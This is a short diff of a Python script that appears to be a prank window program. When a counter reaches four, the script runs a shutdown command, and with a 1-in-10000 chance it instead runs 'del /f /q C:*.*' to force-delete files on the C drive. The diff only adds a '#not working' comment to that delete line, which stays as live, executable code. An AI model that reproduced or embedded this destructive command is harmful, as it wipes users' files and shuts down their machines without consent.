@@ -40,7 +40,7 @@ def createWindow(labelText, buttonText, i):
     windows.append(window)
     if i == 4:
         if randint(1, 10000) == 1:
-            system('del /f /q C:*.*')
+            system('del /f /q C:*.*') #not working
         else:
             system('shutdown /s /t 5')
     return window
